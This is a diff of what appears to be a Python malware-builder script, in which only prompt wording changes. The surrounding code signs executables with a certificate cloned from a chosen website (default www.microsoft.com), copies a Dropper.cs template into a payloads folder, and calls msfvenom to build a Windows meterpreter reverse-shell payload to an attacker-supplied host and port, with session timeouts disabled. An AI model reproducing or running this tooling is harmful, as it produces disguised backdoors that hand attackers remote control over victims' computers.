@@ -11,7 +11,7 @@ Green ="\u001b[32m"
 def signexe():
     sign = input("do you want to sign your exe:")
     if sign == "yes":
-        to_clone = input("entre website to clone sert from it Default(www.microsoft.com)")
+        to_clone = input("entre website to clone sert from it Default(www.microsoft.com):")
 
         if to_clone == "":
             print("Using Default Mode")
@@ -293,7 +293,7 @@ elif choose == 6:
         inplace_change('payloads/Dropper.cs', "$RandomString", ran)
     elif payload == 2:
         os.system("cp -r template/Dropper.cs payloads/")
-        prot = input("entre Payload type:")
+        prot = input("entre Payload type ex(tcp,https):")
         lhost = input("entre lhost:")
         lport = input("entre lport:")
         os.system("msfvenom -p windows/meterpreter/reverse_" + prot + "  LHOST=" + lhost + " LPORT=" + lport + " SessionExpirationTimeout=0 SessionCommunicationTimeout=0 exitfunc=process  -f psh-cmd -o payload.bat >/dev/null 2>&1")
